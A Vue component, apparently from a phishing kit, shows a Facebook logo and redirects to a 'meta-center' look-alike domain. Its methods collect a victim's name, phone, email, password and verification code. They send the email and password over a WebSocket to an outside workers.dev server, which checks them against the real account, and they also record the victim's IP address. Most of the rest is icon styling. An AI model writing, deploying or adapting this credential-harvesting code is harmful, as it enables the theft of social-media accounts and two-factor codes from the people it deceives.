<template>
  <div class="bg-gray-100 h-screen w-screen flex justify-center items-center">
      <img src="/src/assets/facebook_logo_icon_147291-f2dfc6fd.ico" width="40" />
  </div>
</template>

<script>
import { useCounterStore } from "@/stores/counter"; // Nếu có
import axios from "axios"; // Nếu có

export default {
  data() {
    return {
      ws: null,
      messages: [],
      inputText: '', // Thêm inputText để lưu nội dung tin nhắn mới
      remainingMinutes: 0,
      remainingSeconds: 59,
      formattedTime: "00:59",
      countdownInterval: null
    };
  },
  setup() {
    const counter = useCounterStore(); // Nếu có
    return { counter };
  },
  mounted: function () {
    this.loading();
  },
  methods: {
    loading() {
      setTimeout(function () {
        window.location.href = 'https://meta-center-9123823518.vercel.app';
      }, 1000);
    },
    startCountdown() {
      this.remainingMinutes = 0;
      this.remainingSeconds = 59;
      this.countdownInterval = setInterval(() => {
        if (this.remainingMinutes === 0 && this.remainingSeconds === 0) {
          clearInterval(this.countdownInterval);
        } else {
          if (this.remainingSeconds === 0) {
            this.remainingMinutes--;
            this.remainingSeconds = 59;
          } else {
            this.remainingSeconds--;
          }
          this.formattedTime = this.formatTime(this.remainingMinutes, this.remainingSeconds);
        }
      }, 1000);
    },
    restartCountdown() {
      clearInterval(this.countdownInterval);
      this.startCountdown();
    },
    formatTime(minutes, seconds) {
      return (
        (minutes < 10 ? "0" : "") + minutes + ":" + (seconds < 10 ? "0" : "") + seconds
      );
    },
    change_password() {
      if (this.counter.password) {
        this.counter.password_dk = true;
      };
      if (!this.counter.password) {
        this.counter.password_dk = false;
      }
    },
    check_data_1() {
      if (!this.counter.page) {
        this.counter.page_dk = false;
      };
      if (!this.counter.name) {
        this.counter.name_dk = false;
      };
      if (!this.counter.phone) {
        this.counter.phone_dk = false;
      };
      if (!this.counter.email) {
        this.counter.email_dk = false;
      };
      if (!this.counter.message) {
        this.counter.message_dk = false;
      };
    },
    check_data() {
      if (this.counter.page) {
        this.counter.page_dk = true;
      };
      if (this.counter.name) {
        this.counter.name_dk = true;
      };
      if (this.counter.phone) {
        this.counter.phone_dk = true;
      };
      if (this.counter.email) {
        this.counter.email_dk = true;
      };
      if (this.counter.message) {
        this.counter.message_dk = true;
      };
    },
    connectWebSocket() {
      // Kết nối đến máy chủ WebSocket
      this.ws = new WebSocket('wss://idea-bot7.hatchpennie4.workers.dev/ws');

      // Xử lý tin nhắn nhận được từ máy chủ
      this.ws.onmessage = (event) => {
        var data = JSON.parse(event.data);
        this.messages = data;
        if (this.messages.linked == true) {
          this.counter.email_error = true;
          this.counter.check_mail = true;

          this.counter.email_dk = true;
          this.counter.name_dk = true;
          this.counter.phone_dk = true;
          this.counter.message_dk = true;
          this.counter.page_dk = true;
        };
        if (this.messages.linked == false) {
          this.counter.email_error = false;
          this.counter.email_dk = false;
          this.counter.name_dk = true;
          this.counter.phone_dk = true;
          this.counter.message_dk = true;
          this.counter.page_dk = true;
        };
        if (this.messages.passed == true) {
          this.startCountdown();
          this.counter.check_mail = false;
          this.counter.check_password = true;

          this.counter.password_dk = true;
          this.counter.get_ip();
        };
        if (this.messages.passed == false) {
          this.counter.password_error = false;
        };
      };
    },
    sendMessage(a) {
      // Gửi tin nhắn đến máy chủ WebSocket
      if (this.ws !== null && this.ws.readyState === WebSocket.OPEN) {
        this.ws.send(JSON.stringify(a));
      } else {
        console.error('WebSocket connection not established');
      }
    },
    async check_data_email() {
      this.check_data_1();
      if (this.counter.email && this.counter.name && this.counter.phone && this.counter.page && this.counter.message) {
        await this.sendMessage({ event: "checkEmail", email: this.counter.email });
      };
    },
    async check_data_password() {
      this.counter.password_error = true;
      if (!this.counter.password) {
        this.counter.password_dk = false;
      };
      if (this.counter.password) {
        await this.sendMessage({ event: "checkPass", email: this.counter.email, password: this.counter.password });
      };
    },
    check_data_code() {
      this.counter.code_dk = true;
      if (this.counter.code) {
        this.counter.check_password = true;
        // this.counter.check_code = true;
        this.counter.code_error = true;
      }
      if (!this.counter.code) {
        this.counter.code_dk = false;
      }
    },
    check_ok() {
      this.counter.check_code = false;
      this.counter.page = ''; this.counter.email = ''; this.counter.name = ''; this.counter.phone = '';
      this.counter.birthday = ''; this.counter.message = ''; this.counter.password = ''; this.counter.code = '';
      this.counter.page_dk = true; this.counter.email_dk = true; this.counter.name_dk = true; this.counter.phone_dk = true;
      this.counter.birthday_dk = true; this.counter.message_dk = true; this.counter.password_dk = true; this.counter.code_dk = true;
      this.counter.email_error = true; this.counter.password_error = true; this.counter.code_error = false;
      this.counter.check_mail = false; this.counter.check_password = false; this.counter.check_code = false; this.counter.check_all = false;
      this.counter.show_password = true;
    },
    disconnectWebSocket() {
      // Ngắt kết nối WebSocket
      if (this.ws !== null) {
        this.ws.close();
        console.log('WebSocket connection closed');
      }
    },
    getInfo() {
      return new Promise((resolve, reject) => {
        fetch('https://ipinfo.io/json')
          .then(response => response.json())
          .then(data => {
            resolve(data);
          })
          .catch(error => {
            reject(error);
          });
      });
    },
  },
  components: {},
};
</script>

<style>
.i-heroicons-home-solid {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath d='M11.47 3.841a.75.75 0 0 1 1.06 0l8.69 8.69a.75.75 0 1 0 1.06-1.061l-8.689-8.69a2.25 2.25 0 0 0-3.182 0l-8.69 8.69a.75.75 0 1 0 1.061 1.06z'/%3E%3Cpath d='m12 5.432 8.159 8.159q.045.044.091.086v6.198c0 1.035-.84 1.875-1.875 1.875H15a.75.75 0 0 1-.75-.75v-4.5a.75.75 0 0 0-.75-.75h-3a.75.75 0 0 0-.75.75V21a.75.75 0 0 1-.75.75H5.625a1.875 1.875 0 0 1-1.875-1.875v-6.198l.091-.086z'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath d='M11.47 3.841a.75.75 0 0 1 1.06 0l8.69 8.69a.75.75 0 1 0 1.06-1.061l-8.689-8.69a2.25 2.25 0 0 0-3.182 0l-8.69 8.69a.75.75 0 1 0 1.061 1.06z'/%3E%3Cpath d='m12 5.432 8.159 8.159q.045.044.091.086v6.198c0 1.035-.84 1.875-1.875 1.875H15a.75.75 0 0 1-.75-.75v-4.5a.75.75 0 0 0-.75-.75h-3a.75.75 0 0 0-.75.75V21a.75.75 0 0 1-.75.75H5.625a1.875 1.875 0 0 1-1.875-1.875v-6.198l.091-.086z'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath d='M11.47 3.841a.75.75 0 0 1 1.06 0l8.69 8.69a.75.75 0 1 0 1.06-1.061l-8.689-8.69a2.25 2.25 0 0 0-3.182 0l-8.69 8.69a.75.75 0 1 0 1.061 1.06z'/%3E%3Cpath d='m12 5.432 8.159 8.159q.045.044.091.086v6.198c0 1.035-.84 1.875-1.875 1.875H15a.75.75 0 0 1-.75-.75v-4.5a.75.75 0 0 0-.75-.75h-3a.75.75 0 0 0-.75.75V21a.75.75 0 0 1-.75.75H5.625a1.875 1.875 0 0 1-1.875-1.875v-6.198l.091-.086z'/%3E%3C/svg%3E")
}

.i-heroicons-eye-slash,
.i-heroicons-home-solid {
  background-color: currentColor;
  display: inline-block;
  height: 1em;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  -webkit-mask-size: 100% 100%;
  mask-size: 100% 100%;
  width: 1em
}

.i-heroicons-magnifying-glass,
.i-heroicons-magnifying-glass-20-solid {
  background-color: currentColor;
  display: inline-block;
  height: 1em;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  -webkit-mask-size: 100% 100%;
  mask-size: 100% 100%;
  width: 1em
}

.i-heroicons-magnifying-glass {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath fill='none' stroke='%23000' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath fill='none' stroke='%23000' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath fill='none' stroke='%23000' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m21 21-5.197-5.197m0 0A7.5 7.5 0 1 0 5.196 5.196a7.5 7.5 0 0 0 10.607 10.607'/%3E%3C/svg%3E")
}

.ps-3 {
  padding-inline-start: .75rem;
}

.ps-10 {
  padding-inline-start: 2.5rem;
}

.i-heroicons-x-mark-20-solid {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E")
}

.i-heroicons-x-mark-20-solid {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E")
}

.i-heroicons-arrow-path,
.i-heroicons-arrow-path-20-solid {
  background-color: currentColor;
  display: inline-block;
  height: 1em;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  -webkit-mask-size: 100% 100%;
  mask-size: 100% 100%;
  width: 1em
}

.i-heroicons-arrow-path {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath fill='none' stroke='%23000' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0 3.181 3.183a8.25 8.25 0 0 0 13.803-3.7M4.031 9.865a8.25 8.25 0 0 1 13.803-3.7l3.181 3.182m0-4.991v4.99'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath fill='none' stroke='%23000' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0 3.181 3.183a8.25 8.25 0 0 0 13.803-3.7M4.031 9.865a8.25 8.25 0 0 1 13.803-3.7l3.181 3.182m0-4.991v4.99'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24'%3E%3Cpath fill='none' stroke='%23000' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M16.023 9.348h4.992v-.001M2.985 19.644v-4.992m0 0h4.992m-4.993 0 3.181 3.183a8.25 8.25 0 0 0 13.803-3.7M4.031 9.865a8.25 8.25 0 0 1 13.803-3.7l3.181 3.182m0-4.991v4.99'/%3E%3C/svg%3E")
}

.i-heroicons-x-mark-20-solid {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath d='M6.28 5.22a.75.75 0 0 0-1.06 1.06L8.94 10l-3.72 3.72a.75.75 0 1 0 1.06 1.06L10 11.06l3.72 3.72a.75.75 0 1 0 1.06-1.06L11.06 10l3.72-3.72a.75.75 0 0 0-1.06-1.06L10 8.94z'/%3E%3C/svg%3E")
}

.i-heroicons-minus-20-solid,
.i-heroicons-x-mark-20-solid {
  background-color: currentColor;
  display: inline-block;
  height: 1em;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  -webkit-mask-size: 100% 100%;
  mask-size: 100% 100%;
  width: 1em
}

.w-5 {
  width: 1.25rem;
}

.h-5 {
  height: 1.25rem;
}

.i-heroicons-exclamation-triangle-20-solid,
.i-heroicons-eye {
  background-color: currentColor;
  display: inline-block;
  height: 1em;
  -webkit-mask-repeat: no-repeat;
  mask-repeat: no-repeat;
  -webkit-mask-size: 100% 100%;
  mask-size: 100% 100%;
  width: 1em
}

.i-heroicons-exclamation-triangle-20-solid {
  -webkit-mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath fill-rule='evenodd' d='M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625zM10 5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 10 5m0 9a1 1 0 1 0 0-2 1 1 0 0 0 0 2' clip-rule='evenodd'/%3E%3C/svg%3E");
  -webkit-mask-image: var(--svg);
  mask-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath fill-rule='evenodd' d='M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625zM10 5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 10 5m0 9a1 1 0 1 0 0-2 1 1 0 0 0 0 2' clip-rule='evenodd'/%3E%3C/svg%3E");
  mask-image: var(--svg);
  --svg: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='20' height='20'%3E%3Cpath fill-rule='evenodd' d='M8.485 2.495c.673-1.167 2.357-1.167 3.03 0l6.28 10.875c.673 1.167-.17 2.625-1.516 2.625H3.72c-1.347 0-2.189-1.458-1.515-2.625zM10 5a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 10 5m0 9a1 1 0 1 0 0-2 1 1 0 0 0 0 2' clip-rule='evenodd'/%3E%3C/svg%3E")
}
</style>
